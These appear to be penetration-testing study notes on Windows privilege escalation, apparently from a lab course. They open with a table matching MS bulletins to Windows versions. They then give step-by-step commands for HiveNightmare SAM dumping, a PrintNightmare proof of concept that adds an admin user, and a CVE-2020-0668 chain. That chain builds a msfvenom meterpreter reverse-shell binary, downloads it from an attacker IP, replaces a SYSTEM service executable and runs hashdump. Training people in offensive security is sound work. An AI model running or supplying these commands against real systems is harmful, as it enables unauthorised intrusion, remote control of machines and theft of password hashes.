Windows vulnerabilities: https://msrc.microsoft.com/update-guide/vulnerability

Microsoft Update Catalog: https://www.catalog.update.microsoft.com/Search.aspx?q=KB5000808

Base OS	XP				2003			Vista			2008		7		2008R2		8	8.1	2012	2012R2	10	2016
Service Pack	SP0	SP1	SP2	SP3	SP0	SP1	SP2	SP0	SP1	SP2	SP0	SP2	SP0	SP1	SP0	SP1						
MS03-026	•	•	•	•	•	•	•															
MS05-039	•	•	•		•	•																
MS08-025	•	•	•		•	•	•	•	•		•											
MS08-067	•	•	•	•	•	•	•	•	•		•											
MS08-068	•	•	•	•	•	•	•	•	•		•											
MS09-012	•	•	•	•	•	•	•	•	•		•											
MS09-050								•	•	•	•	•										
MS10-015			•	•	•	•	•	•	•	•												
MS10-059								•	•	•	•	•	•		•							
MS10-092								•	•	•	•	•	•		•							
MS11-011				•	•	•	•	•	•	•	•	•	•		•							
MS11-046				•	•	•	•	•	•	•	•	•	•	•	•	•						
MS11-062				•	•	•	•															
MS11-080				•	•	•	•															
MS13-005								•	•	•	•	•	•	•	•	•	•		•			
MS13-053				•	•	•	•	•	•	•	•	•	•	•	•	•	•		•			
MS13-081			•	•	•	•	•	•	•	•	•	•	•	•	•	•	•		•			
MS14-002				•	•	•	•															
MS14-040					•	•	•	•	•	•	•	•	•	•	•	•	•	•	•	•		
MS14-058					•	•	•	•	•	•	•	•	•	•	•	•	•	•	•	•		
MS14-062					•	•	•															
MS14-068					•	•	•	•	•	•	•	•	•	•	•	•	•	•	•	•		
MS14-070					•	•	•															
MS15-001													•	•	•	•	•	•	•	•		
MS15-010					•	•	•	•	•	•	•	•	•	•	•	•	•	•	•	•		
MS15-051					•	•	•	•	•	•	•	•	•	•	•	•	•	•	•	•		
MS15-061					•	•	•	•	•	•	•	•	•	•	•	•	•	•	•	•		
MS15-076					•	•	•	•	•	•	•	•	•	•	•	•	•	•	•	•		
MS15-078								•	•	•	•	•	•	•	•	•	•	•	•	•		
MS15-097								•	•	•	•	•	•	•	•	•	•	•	•	•	•	
MS16-016								•	•	•	•	•	•	•	•	•						
MS16-032								•	•	•	•	•	•	•	•	•		•	•	•		
MS16-135								•	•	•	•	•	•	•	•	•		•	•	•	•	•
MS17-010								•	•	•	•	•	•	•	•	•	•	•	•	•	•	•
CVE-2017-0213: COM Aggregate Marshaler													•	•	•	•	•	•	•	•	•	•
Hot Potato													•	•	•	•	•	•	•	•	•	
SmashedPotato													•	•	•	•	•	•	•	•	•	


## Notable Vulnerabilities

- MS08-067: https://0xdf.gitlab.io/2019/02/21/htb-legacy.html
- MS17-010: (EternalBlue) https://0xdf.gitlab.io/2021/05/11/htb-blue.html
- ALPC Task Scheduler 0-Day: https://snowscan.io/htb-writeup-hackback/
- CVE-2021-36934 HiveNightmare: (SeriousSam) https://github.com/GossiTheDog/HiveNightmare/blob/master/Mitigation.ps1, https://github.com/GossiTheDog/HiveNightmare/tree/master/Release, https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5

**Checking Permissions on the SAM File
```
icacls c:\Windows\System32\config\SAM
```
- Readable by BUILTIN\Users means it is vulnerable

**Performing Attack and Parsing Password Hashes
```
.\HiveNightmare.exe
impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local
```
- Transfer the 3 files to host, then run second command


- CVE-2021-1675/CVE-2021-34527 PrintNightmare: https://github.com/calebstewart/CVE-2021-1675

**Checking for Spooler Service
```
ls \\localhost\pipe\spoolss
```
- If it does not exist, we will receive "path does not exist error"

**Adding Local Admin with PrintNightmare PowerShell PoC
```
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```

**Confirming New Admin User
```
net user hacker
```


## Enumerating Missing Patches

**Examining Installed Updates
```
systeminfo
wmic qfe list brief
Get-Hotfix
```

**Viewing Installed Updates with WMI
```
wmic qfe list brief
```
- Use Microsoft Update Catalog to check dates

## CVE-2020-0668
https://itm4n.github.io/cve-2020-0668-windows-service-tracing-eop/

**Checking Current User Privileges
```
whoami /priv
```

**After Building Solution

https://github.com/RedCursorSecurityConsulting/CVE-2020-0668
- Open in Visual Studio within a VM and build the solution, it will generate:
```
CVE-2020-0668.exe
CVE-2020-0668.exe.config
CVE-2020-0668.pdb
NtApiDotNet.dll
NtApiDotNet.xml
```
- Then, we combine this with one of the following:
- https://github.com/itm4n/UsoDllLoader
- https://github.com/xct/diaghub
- Mozilla Maintenance Service runs as system and is startable by unprivileged users

**Checking Permissions on Binary
```
icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```
- We have read and execute

**Generating Malicious Binary
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe
```

**Hosting the Malicious Binary
```
python3 -m http.server 8080
```

**Downloading the Malicious Binary
```
wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice.exe
wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice2.exe
```
- We must do this twice because one get corrupted, and we will replace it

**Running the Exploit
```
C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

**Checking Permissions of New File
```
icacls 'C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe'
```
- WINLPE-WS02\htb-student:(F) means we have full control over the binary, so we can overwrite it with a non-corrupted version of our malicious binary

**Replacing File with Malicious Binary
```
copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

**Metasploit Resource Script
```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST <our_ip>
set LPORT 8443
exploit
```
- Save to handler.rc

**Launching Metasploit with Resource Script
```
sudo msfconsole -r handler.rc
```

**Starting the Service
```
net start MozillaMaintenance
```

**Receiving a Meterpreter Session
```
getuid
hashdump
```
